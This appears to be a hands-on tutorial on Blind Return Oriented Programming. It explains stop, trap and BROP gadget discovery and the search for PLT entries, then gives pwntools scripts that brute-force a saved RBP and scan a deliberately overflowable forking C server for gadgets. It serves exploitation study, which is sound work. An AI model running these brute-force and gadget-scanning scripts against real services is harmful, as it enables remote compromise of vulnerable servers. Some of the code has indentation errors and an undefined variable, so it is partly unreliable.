# Exploits : Blind Return Oriented Programming
## Requires knowledge : Return Oriented Programming 
## Introduction
64 BITS
What is Blind Return Oriented Programming ?  
As you may know before getting there, there is something called Return Oriented Programming usually called `ROP`, this technique was an exploitation technique that is usually used to defeat every `NX` and `ASLR` things by never jumping to somewhere else than the `.text` segement, we had a look at what are gadgets and how to use them tto create a program inside our program that we could use to exploit it  
Now the thing is that, in normal ROP, we knew the binary, like we could debug it, take some addresses from it as we could read it...
Now imagine you want to attack a binary but completely blindly, you don't know anything about it, no compiled code, no source code, usually the main scenario is that it's a server running on TCP (but doesn't have to) where the program which is unknown by the attacker, now in this case, how can you exploit it ? How can you make any ROP, how can you get any gadget from it if you can't even read the binary ?  
Well, you probably already know what i'm gonna say, this is where Blind Return Oriented Programming often abreviated in Blind ROP on BROP comes to play  
With this technique, we can exploit the binary without even knowing it
## Conditions of the attack
In the case we want to exploit the binary, there are a few conditions, first, a `stack based buffer overflow`, logical (actually there are other vulnerabilities that are not this that can lead to this attack)  
Also, the binary has to respawn after crash, as we will try to make it crash and will reuse it many times  
If the program uses `PIE` or/and `Stack Canary`, it has to respawn after crash with the same memory as a looped fork does (i explain in this article : Exploit-fork.md

## General insight of the attack
If someone asked me to give a really abstract explaination of what is BROP, i would say this :
This is a 2 or 3 main steps attack :
* Step 1 (if the program uses `SSP` or/and `PIE`) : Stack Canary : Finding the stack canary and the RIP backup
* Step 2 : Finding gadgets with techniques and eventually find a write to our socket primitive : Basically, there is no direct way to leak data as we want to leak the whole binary at the end, so with some techniques and especially a crutial knowledge : Does the program crash when i do this or not we can get 3 required gadgets and the address of write function in PLT, the 3 gadgets are used to pass write argument
* Step 3 : Binary Leak : Once we have found our write and our gadgets so we can call it, we have an arbitrary read of any address, so we send its connect via our socket  

Once we have the binary, we are completely done, now we can exploit as a normal binary that we know
## Exploitation explaination
### Step 1 : Stack Reading
I won't cover the stack reading here (maybe later in the article)
### Step 2 : Finding gadgets and write

So we're looking for a way to control `RDI`, `RSI`, `RDX` and we want to find `write`  

Once we have them we can just :
* RDI : SOCKFD for the socket
* RSI : Buffer to write
* RDX : Length to write
And then call write  

Once we have them we can start leaking the binary  

**Finding Gadgets**  

For Blind ROP there are some gadgets that are used for the attack :

- Stop gadgets : When we jump to them, the program doesn't crash and is in an infinite loop  
- Trap gadgets : When we jump to them, the program crashes, for example a null ptr = 0 is a trap gadget because when we jump to it we crash

Now we want to scan binary for gadgets
We're in a loop and at each iteration we overwrite RIP backup with an address, the address starts at, let's say the program base, which is usually `0x400000` in 64 bits binary, if it has PIE and you do stack reading you can find it, now at each iteration we test the next address, so we increment by 1
We call PROBE the address we're testing  

What i mean by probe is that we are testing an address PROBE and we want to understand its behaviour  

Now imagine the following payload :
```
BUFFER | RBP backup |  RIP backup
...    | 8 bytes    |  PROBE       
```
```
After the RIP backup we add this :  
| TRAP GADGET | TRAP GADGET |
| 8 bytes     | 8 bytes     |
```
Now imagine that the PROBE gadget is a :
```asm
pop <register>
ret
```
It will pop our first TRAP GADGET to the register  
Then it's gonna return the second TRAP GADGET  
Which will cause a crash because we're returning into a trap gadget  

Now imagine instead of our two trap gadgets we have this :
```
| STOP GADGET | STOP GADGET |
| 8 bytes     | 8 bytes     |
```
Imagine it's the same PROBE gadget  
So now it will pop the address of the STOP GADGET into the register  
Then because of the ret it's gonna return to the second STOP gadget  
And now it's not crashing anymore  
Now that the same behaviour is observed if instead of our two stop gadgets we have :
```
| TRAP GADGET | STOP GADGET |
| 8 bytes     | 8 bytes     |
```
In the case it's a :
```
pop <register>
ret
```
So it pops TRAP GADGET address into register  
And ret returns to the STOP GADGET  
And so the program doesn't crash neither  
Now what if we have the same disposition of our payload so :
`buffer THEN RBP backup THEN PROBE THEN TRAP GADGET THEN STOP GADGET`  
What if probe doesn't contain any pop (except then ret which pops rip)  
So for example :
```
xor eax, ebx
ret
```
Or even just :
```
ret
```
Since TRAP GADGET address in not popped before the ret  
It will return to the TRAP GADGET address and... Crash  
We can now identify certain types of gadgets  
**The BROP gadget**  
The BROP gadget is a specific gadget which consists of these instructions :  
```
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```
This gadget might tell you something if you have ever done some ret2csu  
So this gadget has 6 pops in it  
Usually there are no such gadgets except this one that have 6 pops in it  
Therefore it makes it easier to identify  
But this gadget doesn't contain any `pop rdi`, `pop rsi` or `pop rdx` reference  
BUT we know that this gadget is part of a function called `__libcsu_init` and since we know it's code  
We know that BROP GADGET+7 is :
```
pop rsi
pop r15
ret
```
And that BROP GADGET+9 is :
```
pop rdi
ret
```
So knowing its address, we can find a `pop rsi` and a `pop rdi`  
Also `__libcsu_init` i normally present in any ELF binary  
**Identify gadgets**
* If our program is not crashing with `PROBE + STOP GADGET + TRAP GADGET` Then it's a `ret` or `something not pop ; ret` gadget  
* If our program is not crashing with `PROBE + TRAP GADGET + STOP GADGET + TRAP GADGET` Then it's a `pop <register> ; ret` gadget
* If our program is not crashing with `PROBE + 6 TRAP GADGETS + STOP GADGET + 6 TRAP GADGETS` and is crashing with `13 TRAP GADGETS` (so it will ret into the 7th one) then it's a BROP gadget  

For the BROP gadget, for the `PROBE + 6 TRAP GADGETS + STOP GADGET + 6 TRAP GADGETS`  
It's because it will pop exactly 6 times then ret to our stop gadget so it doesn't crash  
However the STOP Gadget also has this behaviour, it won't crash with the previous payload  
Therefore also check if `13 TRAP GADGETS` makes it crash, because it will pop 6 `TRAP GADGETS` then return into the 7th trap gadget so it crashes  
Now that we have our BROP gadget we know the address of our `pop rdi` and our `pop rsi`  
So you may be asking : What about a `pop rdx` or any way to control it ?  
It's a weird answer but we'll use `strcmp`, why ? Because when we call it with two arguments, it sets `rdx` to the string getting compared, so it gives a non zero value for the `size` and that's what we want  

**Finding PLT base**

Our goal is to find `strcmp` which has to be in PLT  
The procedure linkage table contains multiple entries where we can jump to jump to a libc function via it's address stored in Global Offset Table GOT  
The procedure linkage table PLT contains multiple chained PLT entries  
A PLT entry is 3 instructions :
```asm
jmp [GOT_ADDR]
<instruction 2>
<instruction 3>
```
A PLT entry size is 16 bytes  
So to find the PLT address, so the address of the first PLT entry, we need to know this pattern :  
```
ENTRY 1 (16 bytes)  
ENTRY 2 (16 bytes)
ENTRY 3 (16 bytes)
ENTRY 4 (16 bytes)
```
Now to find it it's simple, we know that each `jmp [GOT ADDR]` should not make the server crash  
Therefore we can test an address, test like :
* We'll see if we crash for the address, if we don't we continue if we do we test the next address
* We'll see if we crash for the `address+1*16` so in the next entry of plt, if it's the plt we will have another jmp to got addr here so it won't crash, if we crash we know it's not PLT and we test next address, if we don't we continue
* Now we simply test like 2 other times (for `address+2*16` and `address+3*16`, if all our tests for our 4 address doesn't make the server crash then we know it's the PLT
And so we know the address of the PLT base  

**Finding strcmp in PLT**  

Now that we know where is the PLT, we can start searching for strcmp  
So it's simple, we iterate like 10 times, for each plt entry (actually we don't know how many plt entries there are)  
Starting from the plt entry 0, which is simply the address of plt, we'll jump 4 times to the `jmp [GOT ADDRESS]` with different parameters, then for the next entry we test `PLT BASE+ITERATION*16`  
As I said, we call the PLT entry 4 times :
* We call it with `arg1=valid ptr;arg2=valid ptr;STOP GADGET;TRAP GADGET`, so it runs with arg1 (RDI) and arg2 (RSI) then returns to STOP GADGET, so if it doesn't crash, then we move to the next test, otherwise we test the next entry
* We call it with `arg1=invalid ptr;arg2=valid ptr;STOP GADGET;TRAP GADGET`, since arg1 is an invalid ptr then if it's strcmp it should crash, if it crashes we move to the next check, otherwise we test the next entry
* We call it with `arg1=valid ptr;arg2=invalid ptr;STOP GADGET;TRAP GADGET`, since arg2 is an invalid ptr then if it's strcmp it should crash, if it crashes we move to the next check, otherwise we test the next entry
* We call it with `arg1=invalid ptr;arg2=invalid ptr;STOP GADGET;TRAP GADGET`, since arg1 and arg2 are invalid ptrs then if it's strcmp it should crash, if it crashes then we know it's `strcmp`, otherwise we test the next entry  

And that's how we can find `strcmp`
**Finding write in plt**



Now that we found the plt, we can simply iterate from the plt base with adding 16 on the address at each iteration  
This is write function in libc : `ssize_t write(int fd, const void *buf, size_t count);`
```
int fd => RDI;
const void *buf => RSI;
size_t count => RDX;
```
So before jumping to the address we're testing we call the the `pop rdi` (`brop gadget`+9) setting it to fd, we will test all possible fds range from 0 to 1024], we call the `pop rsi ; pop r15` (`brop gadget+7`) setting `RSI` to the address of the program base (you'll se why) and we call strcmp to set `RDX` to a non-null value (`!= 0`) so it prints bytes  
Now at each iteration, if `ELF` is printed with the output, then we know we found write because at the program base, there is an `ELF` header, which is found at the start of an `ELF` file, so the ELF file content is loaded at program base   

## Exploitation (program using socat)
Time for exploiting  
So here is the source code of the target :
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
void vuln()
{
    char buffer[64];
    read(0, buffer, 500);
    fflush(stdout);
}
int main(void) {
    while(1) {
        if (fork() == 0) {
            vuln();
            return 0;
        }
        int status;
        wait(&status);
        if (status != 0) {
            puts("The forked program has crashed !");
            fflush(stdout);
        }
    }
    return 0;
}
```
Not mine i renamed things  
So as you can see main does an infinite while loop where at each time it calls `fork`  
Fork is a system call that clones the memory of the current running program to a child process, if the the child process crashes, the calling program (the program that called fork) doesn't crash, and we can exit or return in the child process to stop it so the calling process will continue from `wait(&status)`  
So we have a program that can crash and restarts when crashes  
As you can see i used some `puts`, not `write` or anything socket, that's because we'll instead use socket, which redirects stdin and stdout of the program to a socket  
I compiled the program with :
```
gcc main.c -o <compiled program> -fno-stack-protector -no-pie
```
It's in 64 bits  
Disabling stack protector and PIE, ASLR and NX are enabled  
So to start it, we use socat :
```
socat -v tcp-l:<PORT>,fork exec:'./<compiled program>'
```
Replace `<PORT>` with the port you want to use (ex : 8888) and `<compiled program>` with the name of the program you compiled with GCC  
Now if we try to conenct with netcat :
```
nc <IP ADDRESS WHERE THE SERVER IS RUNNING> <PORT>
```
(Example) :
```
nc 127.0.0.1 8888
```
If your socat server is hosted on your machine and port is `8888`  
So i enter :
```
Test input 
Hello program
Did you know that Giraffes have the shortest sleep needs of any mammal. They usually sleep about 30 minutes a day, after taking a few micro naps. That's a super interesting fact
The forked program has crashed !
```
5th line is program output  
As you can see the 3rd input made the server to crash, because we have a buffer overflow  
But there's something we have to care about, it's not because we overwrote `RIP`, but we'll see that later  
So now let's do our blind ROP, assuming that we never saw the source code of the program  
I used pwntools and time modules for my exploit :
```python
# Blind Return Oriented Programming
from pwn import *
import time
```
The message that it prints when the program crashes is `The forked program has crashed !`, so let's store this string in our program :
```python
CRASH_MSG = b"The forked program has crashed !"
```
Let's define a function to connect to our socat server, at each try we will connect to our binary again using this function :
```python
def start_t(t):
	return remote('<SERVER ADDRESS>', <PORT>, timeout=t)
```
Also it has a timeout, that pwntools uses, when we'll call it we'll set the timeout to like 2  

The first function we want to make is a function which checks if the program crashed and closes the connection (the function should be called after sending data to program) :
```python
def recv_check(p):
resp = p.recv()
print("Received :"+str(resp))
p.close()
if CRASH_MSG in resp:
  return 1
else:
  return 0
```
It returns `1` if the program crashed and `0` if it didn't crash  

The second function we want to make is a function that finds the padding before the program crashes :
```python
def find_padding():
	size = 1 # Start with a payload of size 1

	while 1:
    payload = b'A' * (size) # Creates a payload of growing size
    p = start_t(2) # Connect to the server
    p.send(payload)
    #print("before recv")
    time.sleep(0.5) # DON'T REMOVE THIS, it's to be sure data is sent before receiving data from server
    if recv_check(p): # If program crashed
      p.close()
      print("Program crashes at payload of size : "+hex(i))
      return size-1 # last size where it doesn't crash
    # The program didn't crash at this point
    p.close() # Close connection
    log.info("Buffer size not %d" % size)
    size += 1 # test next iteration incrementing the size
```
So it connects at each iteration, sends a payload of `size` bytes, `size` keeps growing at each iteration, then if it crashes, we return `size-1`, not `size` because it crashes at size but we want to return the last (max) `size` where it doesn't crash  
For me it crashes after 64 bytes  
Hmm... But that's the size of our buffer, since `RIP` backup is stored 8 bytes after the buffer so we control it with a payload from size `64 + 8 = 72` then there must be something we overwrote before RBP that crashes the program...  
Remember for now there's no stack canary  
Well it's actually `RBP` backup, i don't know why but if it's value is wrong then the program crashes, so we can simply... Brute force it, you can take a look at my article on the stack reading when the program uses fork : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Exploit-fork.md to understand how the technique works, i won't explain it here :
```python
def brute_force_byte(start_payload):
	for i in range(256):
		p = start_t(2)
		next_test = i
		next_test = bytes([next_test])
		test_payload = start_payload + next_test
		p.send(test_payload)
		#time.sleep(0.5)
		if not recv_check(p):
			return next_test
		if i == 255:
		    log.failure("Failed to find next byte")
		    exit() 
        
def brute_force_rbp(start_payload, length):
	out = b''
	for i in range(length):
		out = out + brute_force_byte(start_payload + out)
	return out
```
So we brute force each byte of `RBP` backup to see which byte at each byte test doesn't make the program crash so we can guess its value  
```python
padding_size = find_padding()
print("Padding before crash : "+str(padding_size))
rbp = brute_force_rbp(b"a"*padding_size, 8)
print("Found RBP backup : "+str(rbp))
```
Now that we have the `RBP` backup, each start of our payloads before `RIP overwrite` will look like :
```
|64*'A' | RBP backup bytes|
```
I found the value : `0x7fffffffde00` for `RBP` backup but it may not be the same for you  
The payload containing our buffer overflow bytes + RBP backup will be called start_payload :
```python
start_payload = b"A"*64
start_payload += rbp
```
So if we want to control `RIP` by overwriting `RIP` backup :
```python
PAYLOAD : |start_payload | ROP CHAIN OR ADDRESS WHERE TO RETURN TO|
          |A*64 | found RBP backup | ROP CHAIN OR ADDRESS WHERE TO RETURN TO|
```
Now that we can control `RIP` via the return pointer (`RIP` backup), let's find our stop gadget, remember, the stop gadget is a gadget which, if we jump to it, then the program doesn't crash :
```python
def get_stop_gadget(start_payload, start_address = 0x400000):
	probe = start_address + 1 # Probe is the address we're testing, we start by setting it to program base + 1

	while 1:
		payload = start_payload 
		payload += p64(probe) # RIP backup / return pointer

		try:
			p = start_t(2) # start connection
			p.recvline() 
			p.sendline(payload) # send payload + "\n"
			time.sleep(0.5) # DON'T REMOVE IT : Make sure that data is sent 
			check = recv_check(p) # Check if we crash or not
			if check: # If we crash
				log.info("Crashed at 0x%x" % probe)
				#p.close()
				probe += 1   # Testing the next one
			else:
			  #p.close()
				print("Found stop gadget")
				return probe
		except Exception: 
      print("Error has occured")
			p.close()
      exit(1)
```
So we start from program base which is usually `0x400000` in 64 bits binaries, then at each address that it's testing that we call probe (which is incremented by 1 at each iteration) it tests if it crashes or not, if it crashes we test the next one, it if doesn't crash then we found our stop gadget !  
Once we have the STOP gadget, for me it was at : `0x401082`  
Now for the BROP gadget we will still iterate on each address of the binary but we'll do 2 checks, we see if it crashes with :
```
6 TRAPS | STOP | 6 TRAPS
```
Because if it's the brop gadget it will pop all 6 traps and then exactly return to the stop gadget  
If it doesn't crash then we do antoher test because at this point it's either a BROP gadget or a STOP gadget :
```
6 TRAPS | 1 TRAP | 6 TRAPS
```
We see if it crashes with 13 traps, if it crashes, then it's a brop gadget and we return it, if it doesn't, it's a stop gadget :  
```python
def get_brop_gadget(start_payload, stop_address, start_address):
	stops = []

	stop = stop_address
	trap = 0x00000000
	probe = start_address

	while 1:

#           ^       |                  |                   |
#           |       v (no pop)         v (exactly 6 pops)  v (too many pops)
#         probe | trap | ... | trap | stop | trap | ... | trap | ...
        
		payload = start_payload
		payload += p64(probe)
		payload += p64(trap) * 6
		payload += p64(stop)
		payload += p64(trap) * 6
		try:
			p = start_t(0.5)
			p.recvline()
			p.sendline(payload)
			time.sleep(0.5)
			if recv_check(p):
				log.info("0x%x is not even likely" % probe)
				probe += 1
				continue
            
			log.info("0x%x is either a stop or brop gadget, second check") 

            # Stop gadget ?
            
            #           ^       |                  |                   |
            #           |       v (no pop)         v (exactly 6 pops)  v (too many pops)
            #         probe | trap | ... | trap | TRAP | trap | ... | trap | ...
            
			try:
				log.info("second check")
				payload = start_payload
				payload += p64(probe)
				payload += p64(trap) * 13

				p = start_t(2)
				p.recvline()
				p.sendline(payload)
				time.sleep(0.5)
				if recv_check(p):
					print("BROP gadget found")
					return probe
				else:
					stops.append(probe)

					log.info("0x%x is a stop gadget" % probe)
					probe += 1
					continue
			except Exception as e:
				p.close()
				log.info("Error : "+str(e))
				continue
            
		except Exception as e:
		    p.close()
		    log.info("Error : "+str(e))
		    continue
```
This code is not mine but you can understand what it does, i kept it because it's good  
